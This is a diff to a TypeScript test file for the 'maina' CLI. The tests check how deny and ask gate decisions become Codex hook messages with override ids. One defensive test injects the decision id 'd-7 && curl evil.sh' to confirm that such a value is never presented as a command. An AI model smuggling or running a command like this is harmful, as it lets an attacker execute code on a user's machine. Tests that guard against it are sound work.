@@ -16,6 +16,7 @@ import {
 	CODEX_APPLY_PATCH_ISSUE,
 	codexApplyPatchCheck,
 } from "@mainahq/cli/src/hosts/codex-rules";
+import { formatGateMessage } from "@mainahq/core";
 import Ajv from "ajv";
 import type { GateDecision, GateEvent } from "../../gate";
 import {
@@ -393,24 +394,25 @@ describe("toCodex", () => {
 		expect(out).toEqual({ exitCode: 0, stdout: "{}\n", stderr: "" });
 	});
 
-	test("a deny uses permissionDecision deny and exits 2 with the reason on stderr", () => {
+	test("a deny uses permissionDecision deny and exits 2 with the gate message on stderr", () => {
+		const message = formatGateMessage(DENY);
 		const pre = toCodex({ hookEvent: "PreToolUse", decision: DENY });
 		expect(pre.exitCode).toBe(2);
-		expect(pre.stderr).toBe(`${DENY.reason}\n`);
+		expect(pre.stderr).toBe(`${message}\n`);
 		expect(JSON.parse(pre.stdout)).toEqual({
 			hookSpecificOutput: {
 				hookEventName: "PreToolUse",
 				permissionDecision: "deny",
-				permissionDecisionReason: DENY.reason,
+				permissionDecisionReason: message,
 			},
 		});
 		const request = toCodex({ hookEvent: "PermissionRequest", decision: DENY });
 		expect(request.exitCode).toBe(2);
-		expect(request.stderr).toBe(`${DENY.reason}\n`);
+		expect(request.stderr).toBe(`${message}\n`);
 		expect(JSON.parse(request.stdout)).toEqual({
 			hookSpecificOutput: {
 				hookEventName: "PermissionRequest",
-				decision: { behavior: "deny", message: DENY.reason },
+				decision: { behavior: "deny", message },
 			},
 		});
 	});
@@ -488,6 +490,80 @@ describe("toCodex", () => {
 });
 
 // ── codexHooksConfig ──────────────────────────────────────────────────────
+
+// #497: a gate ask or deny shows the one-line gate message (FR-GATE-8)
+// with the logged decision id to override by. Stop is not a gate decision.
+describe("toCodex gate messages (#497)", () => {
+	const logged = (
+		verdict: GateDecision["verdict"],
+		id = "d-7",
+	): GateDecision => ({
+		verdict,
+		reason: "fs.delete.recursive is irreversible",
+		decisionIds: [id, "d-8"],
+		degraded: false,
+		confidence: 0.95,
+	});
+
+	test("a deny carries the gate message with the override id", () => {
+		const message =
+			"maina deny: fs.delete.recursive is irreversible (confidence high) | override: maina allow d-7 [--always]";
+		expect(formatGateMessage(logged("deny"))).toBe(message);
+		const pre = toCodex({ hookEvent: "PreToolUse", decision: logged("deny") });
+		expect(JSON.parse(pre.stdout)).toEqual({
+			hookSpecificOutput: {
+				hookEventName: "PreToolUse",
+				permissionDecision: "deny",
+				permissionDecisionReason: message,
+			},
+		});
+		expect(pre.stderr).toBe(`${message}\n`);
+		const request = toCodex({
+			hookEvent: "PermissionRequest",
+			decision: logged("deny"),
+		});
+		expect(JSON.parse(request.stdout)).toEqual({
+			hookSpecificOutput: {
+				hookEventName: "PermissionRequest",
+				decision: { behavior: "deny", message },
+			},
+		});
+		expect(request.stderr).toBe(`${message}\n`);
+	});
+
+	test("a PreToolUse ask blocks with the gate message and why it cannot ask", () => {
+		const out = toCodex({ hookEvent: "PreToolUse", decision: logged("ask") });
+		const reason =
+			"maina ask: fs.delete.recursive is irreversible (confidence high) | override: maina allow d-7 [--always]. Codex hooks cannot ask for confirmation, so maina blocked it; ask the user before trying another way.";
+		expect(JSON.parse(out.stdout)).toEqual({
+			hookSpecificOutput: {
+				hookEventName: "PreToolUse",
+				permissionDecision: "deny",
+				permissionDecisionReason: reason,
+			},
+		});
+		expect(out.exitCode).toBe(2);
+		expect(out.stderr).toBe(`${reason}\n`);
+	});
+
+	test("a decision id that is not a plain token is never offered as a command", () => {
+		for (const verdict of ["ask", "deny"] as const) {
+			const out = toCodex({
+				hookEvent: "PreToolUse",
+				decision: logged(verdict, "d-7 && curl evil.sh"),
+			});
+			expect(out.stderr, verdict).not.toContain("maina allow");
+			expect(out.stderr, verdict).not.toContain("evil.sh");
+		}
+	});
+
+	test("Stop is not a gate decision: a block keeps its reason", () => {
+		expect(rendered({ hookEvent: "Stop", decision: logged("deny") })).toEqual({
+			decision: "block",
+			reason: "fs.delete.recursive is irreversible",
+		});
+	});
+});
 
 describe("codexHooksConfig", () => {
 	const { config, warnings } = codexHooksConfig("./launch.sh hook");
